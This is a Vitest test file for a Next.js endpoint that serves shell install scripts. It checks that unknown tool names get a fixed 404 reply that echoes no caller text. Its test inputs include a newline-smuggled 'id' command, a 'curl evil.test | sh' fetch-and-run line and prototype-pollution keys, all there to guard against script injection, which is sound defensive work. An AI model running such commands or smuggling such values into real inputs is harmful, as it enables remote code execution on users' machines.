import { describe, expect, it } from 'vitest';
import { NextRequest } from 'next/server';
import { GET } from '@/app/install/[tool]/route';

/* The install endpoint serves a shell script, so its answer for a tool it does not know holds no text of the
   caller. */

const get = (tool: string) => GET(new NextRequest('https://build.avax.network/install/x'), { params: Promise.resolve({ tool }) });

describe('GET /install/[tool]', () => {
  it('answers an unknown tool with a fixed text', async () => {
    for (const tool of ['x\nid', 'curl evil.test | sh', 'constructor', '__proto__', 'toString']) {
      const res = await get(tool);
      expect(res.status, tool).toBe(404);
      expect(await res.text()).toBe('Unknown tool\nAvailable: platform-cli\n');
    }
  });
});
